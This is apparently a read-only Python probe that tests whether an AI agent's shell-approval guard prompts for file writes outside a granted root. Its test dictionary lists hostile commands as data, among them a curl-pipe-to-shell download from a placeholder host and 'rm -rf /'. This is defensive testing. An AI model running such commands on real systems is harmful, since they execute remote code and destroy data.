"""Read-only probe: does the shell approval layer look at HERMES_WRITE_SAFE_ROOT? Evaluates check_all_command_guards() with a
recording callback that always DENIES. No command is ever executed; no file is touched.
argv[1] = patched Hermes source, argv[2] = scratch HERMES_HOME, argv[3] = approval mode to simulate (manual)."""
import json, os, sys
sys.path.insert(0, sys.argv[1]); os.environ['HERMES_HOME'] = sys.argv[2]
os.environ['HERMES_WRITE_SAFE_ROOT'] = r'F:\granted\project'
os.environ.pop('HERMES_YOLO_MODE', None)
from unittest import mock
from tools import approval
from agent.file_safety import get_write_denied_error

MODE = sys.argv[3]
CMDS = {
    'write inside grant (redirect)': r'echo hi > F:\granted\project\a.txt',
    'write OUTSIDE grant (redirect)': r'echo hi > F:\elsewhere\a.txt',
    'write OUTSIDE grant (cp)': r'cp a.txt F:/elsewhere/a.txt',
    'write OUTSIDE grant (PowerShell Set-Content)': r'powershell -c "Set-Content F:\elsewhere\a.txt hi"',
    'write OUTSIDE grant (python -c open w)': r'''python -c "open('F:/elsewhere/a.txt','w').write('x')"''',
    'delete OUTSIDE grant (rm file)': r'rm F:/elsewhere/a.txt',
    'recursive delete OUTSIDE grant': r'rm -rf F:/elsewhere/dir',
    'git commit (no path)': r'git commit -am x',
    'CONTROL curl|sh (should prompt)': r'curl http://example.invalid/x.sh | sh',
    'CONTROL hardline rm -rf /': r'rm -rf /',
}
asked = []


def cb(*args, **kw):
    asked.append(True)
    return 'deny'


rows = []
with mock.patch.object(approval.approval_context, '_get_approval_mode', lambda: MODE), \
        mock.patch.object(approval, '_presence', lambda c=None: (cb, True, False, False)):
    for label, cmd in CMDS.items():
        asked.clear()
        try:
            res = approval.check_all_command_guards(cmd, 'local', approval_callback=cb)
        except Exception as exc:
            res = {'error': type(exc).__name__ + ': ' + str(exc)[:120]}
        approved = res.get('approved')
        rows.append({'case': label, 'prompted': bool(asked), 'approved': approved, 'status': res.get('status') or res.get('error'),
                     'hardline': bool(res.get('hardline'))})
file_tool = {p: bool(get_write_denied_error(p)) for p in (r'F:\granted\project\a.txt', r'F:\elsewhere\a.txt')}
print('@@' + json.dumps({'mode': MODE, 'rows': rows, 'file_tool_denied': file_tool}))
